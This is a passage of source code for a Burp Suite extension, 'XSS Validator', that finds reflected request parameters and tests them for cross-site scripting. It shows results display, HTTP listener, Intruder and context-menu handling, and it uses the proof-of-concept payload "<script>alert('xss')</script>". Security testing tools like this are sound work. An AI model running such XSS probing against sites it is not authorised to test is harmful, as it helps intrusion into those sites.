            result['test_payload'] = payload
            result['test_browser'] = browser

            return result

        except Exception as e:
            return {
                'error': str(e),
                'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
                'test_url': url,
                'test_payload': payload,
                'test_browser': browser
            }

    def _add_result(self, result):
        """Add a result to the results table"""
        with self._results_lock:
            self._results.append(result)

            # Check if we should display this result
            show_result = self._config['show_all_results']
            if not show_result:
                # Only show if it's a vulnerability
                enhanced = result.get('enhanced', {})
                show_result = (result.get('value', 0) > 0 or
                               enhanced.get('severity', 'none') != 'none' or
                               enhanced.get('confidence', 0) >= self._config['confidence_threshold'])

            if show_result:
                # Add to table
                row = [
                    result.get('timestamp', ''),
                    result.get('test_url', '')[:50] + ('...' if len(result.get('test_url', '')) > 50 else ''),
                    result.get('method', 'Unknown'),
                    result.get('test_payload', '')[:30] + ('...' if len(result.get('test_payload', '')) > 30 else ''),
                    result.get('test_browser', ''),
                    result.get('enhanced', {}).get('severity', 'none'),
                    "{:.2f}".format(result.get('enhanced', {}).get('confidence', 0)),
                    ', '.join(result.get('enhanced', {}).get('detectionMethods', [])),
                    'Vulnerable' if result.get('value', 0) > 0 else 'Safe'
                ]

                SwingUtilities.invokeLater(lambda: self._results_model.addRow(row))

        # Update counters
        SwingUtilities.invokeLater(lambda: self._update_counters())

    def _refresh_results_display(self):
        """Refresh the results display based on current filter settings"""
        with self._results_lock:
            self._results_model.setRowCount(0)

            for result in self._results:
                show_result = self._config['show_all_results']
                if not show_result:
                    enhanced = result.get('enhanced', {})
                    show_result = (result.get('value', 0) > 0 or
                                   enhanced.get('severity', 'none') != 'none' or
                                   enhanced.get('confidence', 0) >= self._config['confidence_threshold'])

                if show_result:
                    row = [
                        result.get('timestamp', ''),
                        result.get('test_url', '')[:50] + ('...' if len(result.get('test_url', '')) > 50 else ''),
                        result.get('method', 'Unknown'),
                        result.get('test_payload', '')[:30] + (
                            '...' if len(result.get('test_payload', '')) > 30 else ''),
                        result.get('test_browser', ''),
                        result.get('enhanced', {}).get('severity', 'none'),
                        "{:.2f}".format(result.get('enhanced', {}).get('confidence', 0)),
                        ', '.join(result.get('enhanced', {}).get('detectionMethods', [])),
                        'Vulnerable' if result.get('value', 0) > 0 else 'Safe'
                    ]
                    self._results_model.addRow(row)

    def _update_status(self, status):
        """Update status label"""
        SwingUtilities.invokeLater(lambda: self._status_label.setText(status))

    def _show_message(self, message, title, message_type):
        """Show a message dialog"""
        JOptionPane.showMessageDialog(self._main_panel, message, title, message_type)

    def _update_counters(self):
        """Update result counters"""
        with self._results_lock:
            total = len(self._results)
            vulnerabilities = sum(1 for r in self._results if r.get('value', 0) > 0)

        self._processed_label.setText(str(total))
        self._vulnerabilities_label.setText(str(vulnerabilities))

    # ITab implementation
    def getTabCaption(self):
        """Return the tab caption for Burp Suite"""
        return "XSS Validator"

    def getUiComponent(self):
        """Return the UI component for the tab"""
        return self._main_panel

    # IHttpListener implementation
    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
        """Process HTTP messages for auto-testing"""
        if messageIsRequest:
            return

        # Process responses from Intruder with our payloads
        if toolFlag == self._callbacks.TOOL_INTRUDER:
            self._process_intruder_response(messageInfo)
            return

        # Existing auto-test logic for other tools
        if not self._config['auto_test']:
            return

        # Only process responses from certain tools
        if toolFlag not in [self._callbacks.TOOL_PROXY, self._callbacks.TOOL_REPEATER]:
            return

        # Process in background thread
        def process_thread():
            try:
                self._process_response(messageInfo, toolFlag)
            except Exception as e:
                print("[XSS Validator] Error processing response: {}".format(str(e)))

        Thread(process_thread).start()

    def _process_intruder_response(self, messageInfo):
        """Process Intruder responses to test for XSS"""

        def process_thread():
            try:
                request = messageInfo.getRequest()
                response = messageInfo.getResponse()

                if not response:
                    return

                # Get request info
                request_info = self._helpers.analyzeRequest(messageInfo)
                response_info = self._helpers.analyzeResponse(response)

                url = str(request_info.getUrl())
                method = request_info.getMethod()

                # Extract response body
                response_body = response[response_info.getBodyOffset():].tostring()

                # Check if this request contains one of our payloads
                request_str = self._helpers.bytesToString(request)

                with self._intruder_lock:
                    for attack_id, payloads in self._intruder_payloads.items():
                        for payload, payload_info in payloads.items():
                            if payload in request_str:
                                # Found our payload - test for XSS
                                self._update_status("Testing Intruder payload: {}".format(payload[:30] + "..."))

                                # Test with all enabled browsers
                                for browser in self._config['enabled_browsers']:
                                    result = self._test_xss_payload(url, response_body, payload, browser)

                                    # Add metadata
                                    result['method'] = method
                                    result['tool'] = 'Intruder'
                                    result['payload_category'] = payload_info['category']
                                    result['payload_priority'] = payload_info['priority']
                                    result['original_payload'] = payload_info['original_payload']
                                    result['attack_metadata'] = payload_info.get('metadata', {})

                                    self._add_result(result)

                                # Clean up processed payload
                                del payloads[payload]
                                break

                # Clean up empty attacks
                with self._intruder_lock:
                    empty_attacks = [aid for aid, p in self._intruder_payloads.items() if not p]
                    for aid in empty_attacks:
                        del self._intruder_payloads[aid]

            except Exception as e:
                print("[XSS Validator] Error processing Intruder response: {}".format(str(e)))

        Thread(process_thread).start()

    def _process_response(self, messageInfo, toolFlag):
        """Process a single HTTP response"""
        try:
            request = messageInfo.getRequest()
            response = messageInfo.getResponse()

            if not response:
                return

            # Get request/response info
            request_info = self._helpers.analyzeRequest(messageInfo)
            response_info = self._helpers.analyzeResponse(response)

            url = str(request_info.getUrl())
            method = request_info.getMethod()

            # Check if response contains reflection indicators
            response_body = response[response_info.getBodyOffset():].tostring()

            # Look for potential XSS parameters in request
            parameters = request_info.getParameters()

            for param in parameters:
                if param.getType() in [IParameter.PARAM_URL, IParameter.PARAM_BODY]:
                    param_value = param.getValue()

                    # Check if parameter value is reflected in response
                    if param_value and len(param_value) > 3 and param_value.lower() in response_body.lower():
                        # Test with XSS payload
                        if self._config['payload_injection']:
                            payload = "<script>alert('xss')</script>"

                            # Test with enabled browsers
                            for browser in self._config['enabled_browsers']:
                                result = self._test_xss_payload(url, response_body, payload, browser)

                                # Add metadata
                                result['method'] = method
                                result['parameter'] = param.getName()
                                result['tool'] = self._get_tool_name(toolFlag)

                                self._add_result(result)

        except Exception as e:
            print("[XSS Validator] Error in _process_response: {}".format(str(e)))

    def _get_tool_name(self, toolFlag):
        """Get tool name from flag"""
        tool_names = {
            self._callbacks.TOOL_PROXY: "Proxy",
            self._callbacks.TOOL_INTRUDER: "Intruder",
            self._callbacks.TOOL_REPEATER: "Repeater",
            self._callbacks.TOOL_SCANNER: "Scanner"
        }
        return tool_names.get(toolFlag, "Unknown")

    # IContextMenuFactory implementation
    def createMenuItems(self, invocation):
        """Create context menu items"""
        menu_items = []

        if invocation.getInvocationContext() in [invocation.CONTEXT_PROXY_HISTORY,
                                                 invocation.CONTEXT_TARGET_SITE_MAP_TABLE,
                                                 invocation.CONTEXT_INTRUDER_ATTACK_RESULTS]:
            from javax.swing import JMenuItem

            class TestXSSAction(object):
                def __init__(self, extender, invocation):
                    self._extender = extender
                    self._invocation = invocation

                def actionPerformed(self, event):
                    self._extender._context_test_xss(self._invocation)

            menu_item = JMenuItem("Test for XSS")
            menu_item.addActionListener(TestXSSAction(self, invocation))
            menu_items.append(menu_item)

        return menu_items

    def _context_test_xss(self, invocation):
        """Test selected requests for XSS"""

        def test_thread():
            try:
                messages = invocation.getSelectedMessages()

                for message in messages:
                    request_info = self._helpers.analyzeRequest(message)
                    response = message.getResponse()

                    if response:
                        response_info = self._helpers.analyzeResponse(response)
                        url = str(request_info.getUrl())
                        response_body = response[response_info.getBodyOffset():].tostring()

                        # Test with default payload
                        payload = "<script>alert('xss')</script>"

                        for browser in self._config['enabled_browsers']:
                            result = self._test_xss_payload(url, response_body, payload, browser)
                            result['method'] = request_info.getMethod()
                            result['tool'] = "Context Menu"

                            self._add_result(result)

                self._update_status("Context menu testing completed")

            except Exception as e:
                print("[XSS Validator] Error in context test: {}".format(str(e)))

        Thread(test_thread).start()

    # IIntruderPayloadGeneratorFactory implementation
    def getGeneratorName(self):
        """Return the name of the payload generator"""
        return "XSS Validator"

    def createNewInstance(self, attack):
        """Create a new instance of the payload generator"""
        return XSSPayloadGenerator(self, attack)


class SeverityCellRenderer(TableCellRenderer):
    """Custom cell renderer for severity column"""

    def getTableCellRendererComponent(self, table, value, isSelected, hasFocus, row, column):
        from javax.swing import JLabel
        from java.awt import Color

        label = JLabel(str(value))
        label.setOpaque(True)

        # Color coding for severity
        if value == "high":
            label.setBackground(Color(255, 200, 200))  # Light red
        elif value == "medium":
            label.setBackground(Color(255, 255, 200))  # Light yellow
        elif value == "low":
            label.setBackground(Color(200, 255, 200))  # Light green
        else:
            label.setBackground(Color.WHITE)

        if isSelected:
            label.setBackground(label.getBackground().darker())

        return label
